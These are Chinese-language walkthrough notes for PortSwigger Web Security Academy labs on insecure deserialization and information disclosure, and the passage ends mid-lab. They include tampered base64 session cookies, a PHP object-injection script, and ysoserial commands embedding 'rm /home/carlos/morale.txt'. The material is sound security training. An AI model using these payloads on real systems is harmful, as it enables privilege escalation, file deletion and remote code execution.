# Deserialization

[Insecure deserialization | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/deserialization#what-is-the-impact-of-insecure-deserialization)

[Portswigger web security academy：Insecure deserialization - R3col - 博客园 (cnblogs.com)](https://www.cnblogs.com/R3col/p/14510899.html)

## Lab1

### 前置

#### Modifying object attributes

When tampering with the data, as long as the attacker preserves a valid serialized object, the deserialization process will create a server-side object with the modified attribute values.

As a simple example, consider a website that uses a serialized `User` object to store data about a user's session in a cookie. If an attacker spotted this serialized object in an HTTP request, they might decode it to find the following byte stream:

```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

The `isAdmin` attribute is an obvious point of interest. An attacker could simply change the boolean value of the attribute to `1` (true), re-encode the object, and overwrite their current cookie with this modified value. In isolation, this has no effect. However, let's say the website uses this cookie to check whether the current user has access to certain administrative functionality:

```
$user = unserialize($_COOKIE); if ($user->isAdmin === true) { // allow access to admin interface }
```

This vulnerable code would instantiate a `User` object based on the data from the cookie, including the attacker-modified `isAdmin` attribute. At no point is the authenticity of the serialized object checked. This data is then passed into the conditional statement and, in this case, would allow for an easy privilege escalation.

This simple scenario is not common in the wild. However, editing an attribute value in this way demonstrates the first step towards accessing the massive amount of attack-surface exposed by insecure deserialization.

### 题目

```
Lab: Modifying serialized objects
APPRENTICE

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

先登录已知账户 wiener 获得 session ，再查看管理员页面 `/admin` ，抓包观察

```http
GET /admin HTTP/2
Host: 0a7500b4035e4eef83c2be0400f50035.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

把 session 里的内容 base64 解码，得到一串序列化后的字符串

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

我们尝试修改，把 b:0 改为 b:1 ，再 base64 编码替换 session 发包

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```

发现直接显示了 admin 管理员的操作页面

<img src=".\图片\Snipaste_2023-08-05_12-25-09.png" alt="Snipaste_2023-08-05_12-25-09" style="zoom:80%;" />

再根据题目操作功能点，删除 carlos 用户即可

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a7500b4035e4eef83c2be0400f50035.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7500b4035e4eef83c2be0400f50035.web-security-academy.net/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

## Lab2

### 前置

#### Modifying data types

We've seen how you can modify attribute values in serialized objects, but it's also possible to supply unexpected data types.

PHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (`==`) when comparing different data types. For example, if you perform a loose comparison between an integer and a string, PHP will attempt to convert the string to an integer, meaning that `5 == "5"` evaluates to `true`.

Unusually, this also works for any alphanumeric string that starts with a number. In this case, PHP will effectively convert the entire string to an integer value based on the initial number. The rest of the string is ignored completely. Therefore, `5 == "5 of something" `is in practice treated as `5 == 5`.

This becomes even stranger when comparing a string the integer `0`:

```
0 == "Example string" // true
```

Why? Because there is no number, that is, 0 numerals in the string. PHP treats this entire string as the integer `0`.

Consider a case where this loose comparison operator is used in conjunction with user-controllable data from a deserialized object. This could potentially result in dangerous [logic flaws](https://portswigger.net/web-security/logic-flaws).

```
$login = unserialize($_COOKIE) if ($login['password'] == $password) { // log in successfully }
```

Let's say an attacker modified the password attribute so that it contained the integer `0` instead of the expected string. As long as the stored password does not start with a number, the condition would always return `true`, enabling an authentication bypass. Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the `0` would be converted to a string and the condition would evaluate to `false`.

Be aware that when modifying data types in any serialized object format, it is important to remember to update any type labels and length indicators in the serialized data too. Otherwise, the serialized object will be corrupted and will not be deserialized.

### 题目

```
Lab: Modifying serialized data types
PRACTITIONER

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

操作上还是与 lab1 类似，但是这里提到了 php `==` 的 **弱类型**比较

登录 wiener 后，再 访问 /admin 后抓包

```http
GET /admin HTTP/2
Host: 0a4b0059034581ba84eb14e700700045.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkbm1ybzBnbXFsams4bGZ1ZXVvdGp6NW9mMXQ5NTBiMSI7fQ%3d%3d
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

base64 解码 Cookie

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dnmro0gmqljk8lfueuotjz5of1t950b1";}
```

怎么修改这个 Cookie 呢？先把 wiener 改为 administrator，再把 access_token 字段的内容改为 i:0 试试

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

接下来 base64 编码 修改后的内容 替换 cookie 来 访问 `/admin` 与 `/admin/delete?username=carlos`

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

<img src=".\图片\Snipaste_2023-08-05_12-55-48.png" alt="Snipaste_2023-08-05_12-55-48" style="zoom:80%;" />

## Lab3

### 前置

When working directly with binary formats, we recommend using the Hackvertor extension, available from the BApp store. With Hackvertor, you can modify the serialized data as a string, and it will automatically update the binary data, adjusting the offsets accordingly. This can save you a lot of manual effort.

#### Using application functionality

As well as simply checking attribute values, a website's functionality might also perform dangerous operations on data from a deserialized object. In this case, you can use insecure deserialization to pass in unexpected data and leverage the related functionality to do damage.

For example, as part of a website's "Delete user" functionality, the user's profile picture is deleted by accessing the file path in the `$user->image_location` attribute. If this `$user` was created from a serialized object, an attacker could exploit this by passing in a modified object with the `image_location` set to an arbitrary file path. Deleting their own user account would then delete this arbitrary file as well.

### 题目

```
Lab: Using application functionality to exploit insecure deserialization
PRACTITIONER

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

You also have access to a backup account: gregg:rosebud
```

### 答案

登录 wiener 账户，查看功能点

<img src=".\图片\Snipaste_2023-08-05_14-34-47.png" alt="Snipaste_2023-08-05_14-34-47" style="zoom:80%;" />

点击删除账户来抓包拦截，可能这个删除操作会导致任意文件删除漏洞

```http
POST /my-account/delete HTTP/2
Host: 0a07008f0330f89080ef30e9009e00a3.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ6ZmhndjdoNXd0aGdyNzh4b2lyZWV0cGNuY2EzaTBxNyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d
Content-Length: 0
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a07008f0330f89080ef30e9009e00a3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a07008f0330f89080ef30e9009e00a3.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

还是 base64 解码下 Cookie 里的 session 字段的值

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zfhgv7h5wthgr78xoireetpcnca3i0q7";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

我们尝试任意文件删除，把 `avatar_link` 字段值改为 `/home/carlos/morale.txt` 试试

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zfhgv7h5wthgr78xoireetpcnca3i0q7";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

再 base 64 编码 替换 session 的值

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ6ZmhndjdoNXd0aGdyNzh4b2lyZWV0cGNuY2EzaTBxNyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

重发包，则发现通关

## Lab4

### 前置

#### Magic methods

Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name with double-underscores.

Developers can add magic methods to a class in order to predetermine what code should be executed when the corresponding event or scenario occurs. Exactly when and why a magic method is invoked differs from method to method. One of the most common examples in PHP is `__construct()`, which is invoked whenever an object of the class is instantiated, similar to Python's `__init__`. Typically, constructor magic methods like this contain code to initialize the attributes of the instance. However, magic methods can be customized by developers to execute any code they want.

Magic methods are widely used and do not represent a vulnerability on their own. But they can become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object. This can be exploited by an attacker to automatically invoke methods on the deserialized data when the corresponding conditions are met.

Most importantly in this context, some languages have magic methods that are invoked automatically **during** the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.

In Java deserialization, the same applies to the `ObjectInputStream.readObject()` method, which is used to read data from the initial byte stream and essentially acts like a constructor for "re-initializing" a serialized object. However, `Serializable` classes can also declare their own `readObject()` method as follows:

```
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {    // implementation }
```

A `readObject()` method declared in exactly this way acts as a magic method that is invoked during deserialization. This allows the class to control the deserialization of its own fields more closely.

You should pay close attention to any classes that contain these types of magic methods. They allow you to pass data from a serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced exploits.

#### Injecting arbitrary objects

As we've seen, it is occasionally possible to exploit insecure deserialization by simply editing the object supplied by the website. However, injecting arbitrary object types can open up many more possibilities.

In object-oriented programming, the methods available to an object are determined by its class. Therefore, if an attacker can manipulate which class of object is being passed in as serialized data, they can influence what code is executed after, and even during, deserialization.

Deserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized. This effectively allows an attacker to create instances of arbitrary classes. The fact that this object is not of the expected class does not matter. The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then.

If an attacker has access to the source code, they can study all of the available classes in detail. To construct a simple exploit, they would look for classes containing deserialization magic methods, then check whether any of them perform dangerous operations on controllable data. The attacker can then pass in a serialized object of this class to use its magic method for an exploit.

### 题目

```
Lab: Arbitrary object injection in PHP
PRACTITIONER

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

先查看主页源码，找到备份文件的地址

<img src=".\图片\Snipaste_2023-08-05_14-59-00.png" alt="Snipaste_2023-08-05_14-59-00" style="zoom:67%;" />

```
/libs/CustomTemplate.php
```

地址尾部加上 `~` 即可访问成功，这里显示了源码

<img src=".\图片\Snipaste_2023-08-05_15-00-26.png" alt="Snipaste_2023-08-05_15-00-26" style="zoom:80%;" />

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

这里的魔术方法 ，析构函数里有 `unlink()` 删除函数

再抓登录 wiener 账号后 删除账户的数据包

```http
GET /my-account?id=wiener HTTP/2
Host: 0aa600ba043e9571821e839800fb0082.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJibnNsMmtxdHZydmJ6Mnk4a3ZrbmhzbDU1cDg1OWFxYiI7fQ%3d%3d
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0aa600ba043e9571821e839800fb0082.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

解码后查看查看 session

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bnsl2kqtvrvbz2y8kvknhsl55p859aqb";}
```

无关紧要，这里构造 pop 链，很简单

```php
<?php
class CustomTemplate {
    private $template_file_path="/home/carlos/morale.txt";
    private $lock_file_path="/home/carlos/morale.txt";
}   
$p = new CustomTemplate();
echo serialize($p);
?>
```

```
O:14:"CustomTemplate":2:{s:34:"CustomTemplatetemplate_file_path";s:23:"/home/carlos/morale.txt";s:30:"CustomTemplatelock_file_path";s:23:"/home/carlos/morale.txt";}
```

这里 php版本不同生成的不一样，官网解为

```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"/home/carlos/morale.txt";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

接下来操作与上面几关类似，base64 编码 poc 替换掉 原来的 cookie 

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTg6InRlbXBsYXRlX2ZpbGVfcGF0aCI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

## Lab5

### 前置

#### Gadget chains

A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage.

It is important to understand that, unlike some other types of exploit, a gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the website. The only thing the attacker controls is the data that is passed into the gadget chain. This is typically done using a magic method that is invoked during deserialization, sometimes known as a "kick-off gadget".

In the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains. This can sometimes be a simple one or two-step chain, but constructing high-severity attacks will likely require a more elaborate sequence of object instantiations and method invocations. Therefore, being able to construct gadget chains is one of the key aspects of successfully exploiting insecure deserialization.

##### Working with pre-built gadget chains

Manually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access. Fortunately, there are a few options for working with pre-built gadget chains that you can try first.

There are several tools available that provide a range of pre-discovered chains that have been successfully exploited on other websites. Even if you don't have access to the source code, you can use these tools to both identify and exploit insecure deserialization vulnerabilities with relatively little effort. This approach is made possible due to the widespread use of libraries that contain exploitable gadget chains. For example, if a gadget chain in Java's Apache Commons Collections library can be exploited on one website, any other website that implements this library may also be exploitable using the same chain.

##### ysoserial

One such tool for Java deserialization is "ysoserial". This lets you choose one of the provided gadget chains for a library that you think the target application is using, then pass in a command that you want to execute. It then creates an appropriate serialized object based on the selected chain. This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gadget chains manually.

##### Note

In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example:

```
java -jar ysoserial-all.jar \   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \   --add-opens=java.base/java.net=ALL-UNNAMED \   --add-opens=java.base/java.util=ALL-UNNAMED \   [payload] '[command]'
```

### 题目

```
Lab: Exploiting Java deserialization with Apache Commons
PRACTITIONER

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

这题的入口还是 Cookie 里的 sesssion 字段，这里是根据 java 反序列化 来打 cc4 的链子，用到 ysoserial

- In Java versions 16 and above:

  ```
  java -jar ysoserial-all.jar \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     CommonsCollections4 'rm /home/carlos/morale.txt' | base64
  ```

- In Java versions 15 and below:

  ```
  java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" > cc4.ser
  cat cc4.ser | base64 -w 0
  ```

# Information Disclosure

## 前置

### Common sources of information disclosure

Information disclosure can occur in a wide variety of contexts within a website. The following are some common examples of places where you can look to see if sensitive information is exposed.

- [Files for web crawlers](https://portswigger.net/web-security/information-disclosure/exploiting#files-for-web-crawlers)
- [Directory listings](https://portswigger.net/web-security/information-disclosure/exploiting#directory-listings)
- [Developer comments](https://portswigger.net/web-security/information-disclosure/exploiting#developer-comments) LABS
- [Error messages](https://portswigger.net/web-security/information-disclosure/exploiting#error-messages) LABS
- [Debugging data](https://portswigger.net/web-security/information-disclosure/exploiting#debugging-data) LABS
- [User account pages](https://portswigger.net/web-security/information-disclosure/exploiting#user-account-pages) LABS
- [Backup files](https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files) LABS
- [Insecure configuration](https://portswigger.net/web-security/information-disclosure/exploiting#information-disclosure-due-to-insecure-configuration) LABS
- [Version control history](https://portswigger.net/web-security/information-disclosure/exploiting#version-control-history) LABS

#### Files for web crawlers

Many websites provide files at `/robots.txt` and `/sitemap.xml` to help crawlers navigate their site. Among other things, these files often list specific directories that the crawlers should skip, for example, because they may contain sensitive information.

As these files are not usually linked from within the website, they may not immediately appear in Burp's site map. However, it is worth trying to navigate to `/robots.txt` or `/sitemap.xml` manually to see if you find anything of use.

#### Directory listings

Web servers can be configured to automatically list the contents of directories that do not have an index page present. This can aid an attacker by enabling them to quickly identify the resources at a given path, and proceed directly to analyzing and attacking those resources. It particularly increases the exposure of sensitive files within the directory that are not intended to be accessible to users, such as temporary files and crash dumps.

Directory listings themselves are not necessarily a security vulnerability. However, if the website also fails to implement proper access control, leaking the existence and location of sensitive resources in this way is clearly an issue.

#### Developer comments

During development, in-line HTML comments are sometimes added to the markup. These comments are typically stripped before changes are deployed to the production environment. However, comments can sometimes be forgotten, missed, or even left in deliberately because someone wasn't fully aware of the security implications. Although these comments are not visible on the rendered page, they can easily be accessed using Burp, or even the browser's built-in developer tools.

Occasionally, these comments contain information that is useful to an attacker. For example, they might hint at the existence of hidden directories or provide clues about the application logic.

#### Error messages

One of the most common causes of information disclosure is verbose error messages. As a general rule, you should pay close attention to all error messages you encounter during auditing.

The content of error messages can reveal information about what input or data type is expected from a given parameter. This can help you to narrow down your attack by identifying exploitable parameters. It may even just prevent you from wasting time trying to inject payloads that simply won't work.

Verbose error messages can also provide information about different technologies being used by the website. For example, they might explicitly name a template engine, database type, or server that the website is using, along with its version number. This information can be useful because you can easily search for any documented exploits that may exist for this version. Similarly, you can check whether there are any common configuration errors or dangerous default settings that you may be able to exploit. Some of these may be highlighted in the official documentation.

You might also discover that the website is using some kind of open-source framework. In this case, you can study the publicly available source code, which is an invaluable resource for constructing your own exploits.

Differences between error messages can also reveal different application behavior that is occurring behind the scenes. Observing differences in error messages is a crucial aspect of many techniques, such as [SQL injection](https://portswigger.net/web-security/sql-injection), [username enumeration](https://portswigger.net/web-security/authentication/password-based#username-enumeration), and so on.

### How to test for information disclosure vulnerabilities

#### Fuzzing

If you identify interesting parameters, you can try submitting unexpected data types and specially crafted fuzz strings to see what effect this has. Pay close attention; although responses sometimes explicitly disclose interesting information, they can also hint at the application's behavior more subtly. For example, this could be a slight difference in the time taken to process the request. Even if the content of an error message doesn't disclose anything, sometimes the fact that one error case was encountered instead of another one is useful information in itself.

You can automate much of this process using tools such as Burp Intruder. This provides several benefits. Most notably, you can:

- Add payload positions to parameters and use pre-built wordlists of fuzz strings to test a high volume of different inputs in quick succession.
- Easily identify differences in responses by comparing HTTP status codes, response times, lengths, and so on.
- Use grep matching rules to quickly identify occurrences of keywords, such as `error`, `invalid`, `SELECT`, `SQL`, and so on.
- Apply grep extraction rules to extract and compare the content of interesting items within responses.

You can also use the [Logger++](https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81) extension, available from the BApp store. In addition to logging requests and responses from all of Burp's tools, it allows you to define advanced filters for highlighting interesting entries. This is just one of the many Burp extensions that can help you find any sensitive data that is leaked by the website.

## Lab1

### 题目

```
Lab: Information disclosure in error messages
APPRENTICE

This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.
```

### 答案

当我们把博客上的 producted 参数改为其它意义的东西，也可以 FUZZ 大法

<img src=".\图片\Snipaste_2023-08-05_20-42-06.png" alt="Snipaste_2023-08-05_20-42-06" style="zoom:80%;" />

比如改为 `productId="example"` ，则显示出了错误

<img src=".\图片\Snipaste_2023-08-05_20-44-13.png" alt="Snipaste_2023-08-05_20-44-13" style="zoom:67%;" />

爆出了 框架及其版本

## Lab2

### 前置

#### Debugging data

For debugging purposes, many websites generate custom error messages and logs that contain large amounts of information about the application's behavior. While this information is useful during development, it is also extremely useful to an attacker if it is leaked in the production environment.

Debug messages can sometimes contain vital information for developing an attack, including:

- Values for key session variables that can be manipulated via user input
- Hostnames and credentials for back-end components
- File and directory names on the server
- Keys used to encrypt data transmitted via the client

Debugging information may sometimes be logged in a separate file. If an attacker is able to gain access to this file, it can serve as a useful reference for understanding the application's runtime state. It can also provide several clues as to how they can supply crafted input to manipulate the application state and control the information received.

### 题目

```
Lab: Information disclosure on debug page
APPRENTICE

This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable.
```

### 答案

查看博客时查看源码，发现一处注释

<img src=".\图片\image-20230805205235064.png" alt="image-20230805205235064" style="zoom:80%;" />

```
<a href=/cgi-bin/phpinfo.php>Debug</a>
```

这就是一个 debug 页面，是程序员来调试的

<img src=".\图片\Snipaste_2023-08-05_20-55-41.png" alt="Snipaste_2023-08-05_20-55-41" style="zoom:67%;" />

找到重要信息

<img src=".\图片\Snipaste_2023-08-05_20-56-31.png" alt="Snipaste_2023-08-05_20-56-31" style="zoom:67%;" />

## Lab3

### 前置

#### User account pages

By their very nature, a user's profile or account page usually contains sensitive information, such as the user's email address, phone number, API key, and so on. As users normally only have access to their own account page, this does not represent a vulnerability in itself. However, some websites contain [logic flaws](https://portswigger.net/web-security/logic-flaws) that potentially allow an attacker to leverage these pages in order to view other users' data.

For example, consider a website that determines which user's account page to load based on a `user` parameter.

```
GET /user/personal-info?user=carlos
```

Most websites will take steps to prevent an attacker from simply changing this parameter to access arbitrary users' account pages. However, sometimes the logic for loading individual items of data is not as robust.

An attacker may not be able to load another users' account page entirely, but the logic for fetching and rendering the user's registered email address, for example, might not check that the `user` parameter matches the user that is currently logged in. In this case, simply changing the `user` parameter would allow an attacker to display arbitrary users' email addresses on their own account page.

We'll look at these kind of vulnerabilities in more detail when we cover access control and [IDOR](https://portswigger.net/web-security/access-control/idor) vulnerabilities.

#### Read more

- [Access control](https://portswigger.net/web-security/access-control)

#### Source code disclosure via backup files

Obtaining source code access makes it much easier for an attacker to understand the application's behavior and construct high-severity attacks. Sensitive data is sometimes even hard-coded within the source code. Typical examples of this include API keys and credentials for accessing back-end components.

If you can identify that a particular open-source technology is being used, this provides easy access to a limited amount of source code.

Occasionally, it is even possible to cause the website to expose its own source code. When mapping out a website, you might find that some source code files are referenced explicitly. Unfortunately, requesting them does not usually reveal the code itself. When a server handles files with a particular extension, such as `.php`, it will typically execute the code, rather than simply sending it to the client as text. However, in some situations, you can trick a website into returning the contents of the file instead. For example, text editors often generate temporary backup files while the original file is being edited. These temporary files are usually indicated in some way, such as by appending a tilde (`~`) to the filename or adding a different file extension. Requesting a code file using a backup file extension can sometimes allow you to read the contents of the file in the response.

### 题目

```
Lab: Source code disclosure via backup files
APPRENTICE

This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code.
```

### 答案

就是 robots.txt ，反正就看看接下来的常规操作吧

<img src=".\图片\Snipaste_2023-08-05_21-09-41.png" alt="Snipaste_2023-08-05_21-09-41" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-08-05_21-09-48.png" alt="Snipaste_2023-08-05_21-09-48" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-08-05_21-11-10.png" alt="Snipaste_2023-08-05_21-11-10" style="zoom:67%;" />

## Lab4

### 前置

Once an attacker has access to the source code, this can be a huge step towards being able to identify and exploit additional vulnerabilities that would otherwise be almost impossible. One such example is insecure [deserialization](https://portswigger.net/web-security/deserialization). We'll look at this vulnerability later in a dedicated topic.

#### Read more

- [Insecure deserialization](https://portswigger.net/web-security/deserialization)

#### Information disclosure due to insecure configuration

Websites are sometimes vulnerable as a result of improper configuration. This is especially common due to the widespread use of third-party technologies, whose vast array of configuration options are not necessarily well-understood by those implementing them.

In other cases, developers might forget to disable various debugging options in the production environment. For example, the HTTP `TRACE` method is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the `TRACE` method by echoing in the response the exact request that was received. This behavior is often harmless, but occasionally leads to information disclosure, such as the name of internal authentication headers that may be appended to requests by reverse proxies.

### 题目

```
Lab: Authentication bypass via information disclosure
APPRENTICE

